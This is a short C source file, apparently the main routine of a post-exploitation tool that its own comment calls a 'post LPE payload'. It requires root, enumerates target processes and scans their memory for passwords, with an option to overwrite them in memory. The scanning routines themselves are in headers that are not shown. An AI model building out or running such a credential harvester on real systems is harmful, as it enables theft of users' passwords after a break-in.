#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#include "dbg.h"
#include "targets.h"
#include "scanner.h"
#include <time.h>

int main(int argc, char *argv[])
{
    Target targets[MAX_TARGETS];
    int clean = 0;
    int sec = 0;
    clock_t start = clock();

    // Must be root (this is a post LPE payload!)
    if ( getuid() != 0 )
    {
        printf("[!!] MUST BE ROOT\n");
        return -1;
    }
    
    if (argc == 2 && !strcmp(argv[1], "--clean"))
    {
        clean = 1;
	printf("Overwriting passwords in process memory\n");
    }
    // Initialize targets
    memset(targets, 0, sizeof(targets));
    initTargets(targets);

    // Populate targets with pids
    getTargetPids(targets);

#ifdef DEBUG
    dumpTargets(targets);
#endif

    // Process targets for passwords
    if ( processTargets(targets, clean) < 0 )
    {
        log_error("Failed to process targets");
        return -1;
    }

    sec = (clock() - start) / CLOCKS_PER_SEC;
    printf("It takes %d minutes %d seconds \n", sec / 60, sec % 60);

    return 0;
}
